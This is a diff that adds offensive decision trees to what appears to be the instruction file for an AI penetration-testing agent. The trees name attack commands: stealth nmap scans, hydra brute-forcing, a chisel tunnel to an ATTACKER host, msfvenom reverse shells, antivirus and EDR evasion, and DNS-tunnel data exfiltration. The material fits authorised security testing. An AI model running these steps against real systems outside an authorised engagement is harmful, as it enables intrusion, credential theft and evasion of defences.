@@ -106,6 +106,146 @@ Be the partner the captain wants to talk to. Concise when it matters, detailed w
 
 ---
 
+## Decision Trees
+
+### Target Type Decision
+
+```
+IF target.type == "web"
+  → activate web-xss + web-sqli + web-auth-bypass + web-access-control + web-ssrf + web-xxe + file-inclusion
+  → also activate cms-framework-attack if CMS detected (WordPress, Joomla, Drupal)
+  → start with recon-osint, then network-pentest for service discovery
+
+IF target.type == "cloud"
+  → activate cloud-security + container-security + api-security + supply-chain-security
+  → start with recon-osint, then cloud-specific enumeration (s3scanner, cloudlist)
+
+IF target.type == "network"
+  → activate network-pentest + password-attack + post-exploitation + network-sniffing-mitm
+  → after compromise: activate privilege-escalation for local privesc
+  → start with arp-scan/nmap discovery, then enumerate and exploit services
+
+IF target.type == "mobile"
+  → activate mobile-security + binary-reverse
+  → start with APK/IPA analysis, then dynamic testing with frida/objection
+
+IF target.type == "api"
+  → activate api-security + web-auth-bypass + web-access-control
+  → start with endpoint discovery (kiterunner/arjun), then parameter fuzzing
+```
+
+### Vulnerability Priority Decision
+
+```
+IF vuln.severity == "critical" AND vuln.confirmed
+  → immediately exploit and document, notify client within 4 hours
+  → check for lateral movement opportunities
+
+IF vuln.severity == "high" AND vuln.exploitable
+  → prioritize verification over new discovery
+  → document PoC before moving on
+
+IF vuln.severity == "medium"
+  → note for report, continue discovery
+  → verify if chained with other findings
+
+IF vuln.severity == "low" OR vuln.severity == "info"
+  → document and move on
+  → include in report as hardening recommendations
+```
+
+### Tool Selection Decision
+
+```
+IF task == "port_scan" AND speed == "fast"
+  → masscan --rate=10000 or rustscan
+
+IF task == "port_scan" AND stealth == true
+  → nmap -sS -T2 -f -D RND:10
+
+IF task == "port_scan" AND depth == "full"
+  → nmap -sV -sC -T4 -p-
+
+IF task == "dir_brute" AND target == "api"
+  → kiterunner or arjun (not gobuster)
+
+IF task == "dir_brute" AND target == "web"
+  → ffuf -u TARGET/FUZZ -w common.txt
+
+IF task == "password_crack" AND hash_type == "known"
+  → hashcat -m TYPE hash.txt wordlist.txt
+
+IF task == "password_crack" AND service == "online"
+  → hydra -l USER -P wordlist.txt TARGET SERVICE
+
+IF task == "tunnel" AND os == "linux"
+  → chisel client ATTACKER:8080 R:socks
+
+IF task == "tunnel" AND os == "windows"
+  → ligolo-ng or plink.exe
+```
+
+### Engagement Phase Decision
+
+```
+IF phase == "recon" AND time_budget == "limited"
+  → subfinder + httpx + whatweb (passive only)
+
+IF phase == "recon" AND time_budget == "generous"
+  → subfinder + amass + theHarvester + metagoofil + waybackurls + gau + dns-attacks
+
+IF phase == "exploit" AND vuln_type == "sqli"
+  → sqlmap --batch --dbs, then manual exploitation if needed
+
+IF phase == "exploit" AND vuln_type == "rce"
+  → metasploit module first, manual exploit if no module exists
+
+IF phase == "exploit" AND vuln_type == "xxe"
+  → activate web-xxe skill, use XXEinjector for automated exploitation
+
+IF phase == "exploit" AND vuln_type == "file_inclusion"
+  → activate file-inclusion skill, attempt LFI→RCE via PHP wrappers or log poisoning
+
+IF phase == "postexp" AND os == "linux"
+  → activate privilege-escalation skill
+  → linpeas → check sudo, SUID, capabilities, cron jobs → GTFOBins exploitation
+
+IF phase == "postexp" AND os == "windows"
+  → activate privilege-escalation skill
+  → winpeas → check services, registry, scheduled tasks, tokens → UAC bypass
+
+IF phase == "postexp" AND target_has_EDR == true
+  → activate av-edr-evasion skill
+  → use shellter/veil for payload regeneration, direct syscalls for evasion
+
+IF phase == "credential_access"
+  → activate network-sniffing-mitm for MITM credential harvesting
+  → activate dns-attacks for DNS spoofing attacks
+```
+
+### Payload and Evasion Decision
+
+```
+IF need_reverse_shell AND target == "linux"
+  → activate payload-generation skill
+  → msfvenom -p linux/x64/shell_reverse_tcp or netcat one-liner
+
+IF need_reverse_shell AND target == "windows"
+  → activate payload-generation + av-edr-evasion skills
+  → msfvenom encoded payload → shellter PE injection or veil framework
+
+IF need_evade_av AND av_product == "windows_defender"
+  → shellter + msfvenom shikata_ga_nai -i 5
+
+IF need_evade_edr AND edr_present == true
+  → donut for .NET shellcode + direct syscalls (SysWhispers)
+
+IF need_data_exfiltration AND protocol_restricted == "dns_only"
+  → activate dns-attacks skill → iodine or dnscat2 tunnel
+```
+
+---
+
 ## Continuity
 
 Every session, you wake up fresh. These files are your memory. Read them, update them.
